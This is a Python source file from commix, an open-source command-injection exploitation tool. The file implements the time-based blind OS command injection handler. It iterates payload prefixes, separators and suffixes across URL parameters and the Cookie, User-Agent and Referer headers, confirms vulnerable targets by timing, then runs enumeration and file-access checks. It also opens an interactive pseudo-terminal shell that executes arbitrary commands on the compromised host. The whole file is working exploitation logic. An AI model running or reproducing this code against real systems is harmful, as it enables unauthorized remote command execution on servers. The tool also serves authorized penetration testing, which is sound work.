#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.blind_based.techniques.time_based import tb_injector
from src.core.injections.blind_based.techniques.time_based import tb_payloads
from src.core.injections.blind_based.techniques.time_based import tb_enumeration
from src.core.injections.blind_based.techniques.time_based import tb_file_access

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

#-------------------------------------------------
# The "time-based" injection technique handler.
#-------------------------------------------------
def tb_injection_handler(url, delay, filename, http_request_method, url_time_response):

  percent = 0
  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  export_injection_info = False

  injection_type = "Blind-based Command Injection"
  technique = "time-based injection technique"

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = menu.options.maxlen
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print Fore.YELLOW + "(^) Warning: The '--url-reload' option is not available in "+ technique +"." + Style.RESET_ALL
  
  percent = str(percent)+"%"
  sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
  sys.stdout.flush()

  # Calculate all possible combinations
  total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))

  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
        num_of_chars = num_of_chars + 1
        
        # Check for bad combination of prefix and separator
        combination = prefix + separator
        if combination in settings.JUNK_COMBINATION:
          prefix = ""
        
        # Define alter shell
        alter_shell = menu.options.alter_shell
        
        # Change TAG on every request to prevent false-positive results.
        TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
        tag_length = len(TAG) + 4
        
        for output_length in range(1, int(tag_length)):
          try:
            
            if alter_shell:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, delay, http_request_method)
            else:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision(separator, TAG, output_length, delay, http_request_method)

            # Fix prefixes / suffixes
            payload = parameters.prefixes(payload, prefix)
            payload = parameters.suffixes(payload, suffix)

            if menu.options.base64:
              payload = base64.b64encode(payload)

            # Check if defined "--verbose" option.
            if menu.options.verbose:
              sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)

            # Cookie Injection
            if settings.COOKIE_INJECTION == True:
              # Check if target host is vulnerable to cookie injection.
              vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
              how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)

            # User-Agent Injection
            elif settings.USER_AGENT_INJECTION == True:
              # Check if target host is vulnerable to user-agent injection.
              vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
              how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)

            # Referer Injection
            elif settings.REFERER_INJECTION == True:
              # Check if target host is vulnerable to referer injection.
              vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
              how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)

            else:
              # Check if target host is vulnerable.
              how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method, url)

            # Injection percentage calculation
            percent = ((num_of_chars * 100) / total)
            float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total * 1.0)),2))

            if percent == 100 and no_result == True:
              if not menu.options.verbose:
                percent = Fore.RED + "FAILED" + Style.RESET_ALL
              else:
                percent = ""
                
            else:
              if (url_time_response <= 1 and how_long >= delay) or \
              (url_time_response >= 2 and how_long > delay):

                # Time relative false positive fixation.
                if len(TAG) == output_length:
                  randv1 = random.randrange(0, 1)
                  randv2 = random.randrange(1, 2)
                  randvcalc = randv1 + randv2
                  cmd = "(" + str(randv1) + "+" + str(randv2) + ")"
                  # Check for false positive resutls
                  output = tb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell)
                  
                if str(output) == str(randvcalc) and len(TAG) == output_length:
                  if not menu.options.verbose:
                    percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                  else:
                    percent = ""
                else:
                  break
                  
              else:
                percent = str(float_percent)+"%"
                
            if not menu.options.verbose:
              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
              sys.stdout.flush()

          except KeyboardInterrupt: 
            raise
        
          except:
            break
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if (url_time_response <= 1 and how_long >= delay) or \
          (url_time_response >= 2 and how_long > delay):

            if len(TAG) == output_length :
              found = True
              no_result = False

              if settings.COOKIE_INJECTION == True: 
                header_name = " Cookie"
                found_vuln_parameter = vuln_parameter
                the_type = " HTTP header"

              elif settings.USER_AGENT_INJECTION == True: 
                header_name = " User-Agent"
                found_vuln_parameter = ""
                the_type = " HTTP header"

              elif settings.REFERER_INJECTION == True: 
                header_name = " Referer"
                found_vuln_parameter = ""
                the_type = " HTTP header"
                
              else:
                header_name = ""
                the_type = " parameter"
                if http_request_method == "GET":
                  found_vuln_parameter = parameters.vuln_GET_param(url)
                else :
                  found_vuln_parameter = vuln_parameter

              if len(found_vuln_parameter) != 0 :
                found_vuln_parameter = " '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 
              
              # Print the findings to log file.
              if export_injection_info == False:
                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
              if vp_flag == True:
                vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
              logs.upload_payload(filename, counter, payload) 
              counter = counter + 1
              
              # Print the findings to terminal.
              print Style.BRIGHT + "\n(!) The ("+ http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to "+ injection_type + "." + Style.RESET_ALL
              print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
              print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL

              # Check for any enumeration options.
              tb_enumeration.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)

              # Check for any system file access options.
              tb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
              
              # Check if defined single cmd.
              if menu.options.os_cmd:
                tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)

              # Pseudo-Terminal shell
              go_back = False
              while True:
                if go_back == True:
                  break
                gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
                if gotshell in settings.CHOISE_YES:
                  print ""
                  print "Pseudo-Terminal (type '?' for shell options)"
                  while True:
                    try:
                      cmd = raw_input("Shell > ")
                      if cmd.lower() in settings.SHELL_OPTIONS:
                        if cmd == "?":
                          menu.shell_options()
                          continue
                        elif cmd.lower() == "quit":
                          sys.exit(0)
                        elif cmd.lower() == "back":
                          go_back = True
                          break
                        else:
                          pass
                        
                      else:
                        # The main command injection exploitation.
                        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)

                      if menu.options.verbose:
                        print ""

                      if output != "" and check_how_long != 0 :
                        print "\n\n" + Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
                        print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
                      else:
                        # Check if exists pipe filtration.
                        if output != False :
                           print "\n" + Fore.YELLOW  + "(^) Warning: It appears that '" + cmd + "' command could not return any output" + (', due to pipe (|) filtration.', '.')[separator == "||"]  + Style.RESET_ALL
                           print Fore.YELLOW  + "             "+ ('To bypass that limitation, u', 'U')[separator == "||"]  +"se '--alter-shell' or try another injection technique (i.e. '--technique=\"f\"')" + Style.RESET_ALL 
                           sys.exit(1)
                        # Check for fault command.
                        else:
                           print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"

                    except KeyboardInterrupt: 
                      raise
                  
                elif gotshell in settings.CHOISE_NO:
                  if menu.options.verbose:
                    sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                    sys.stdout.flush()
                  break

                elif gotshell in settings.CHOISE_QUIT:
                  sys.exit(0)

                else:
                  if gotshell == "":
                    gotshell = "enter"
                  print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
                  pass
            
            break
          
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method, url_time_response):
  if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
    return False
    
#eof
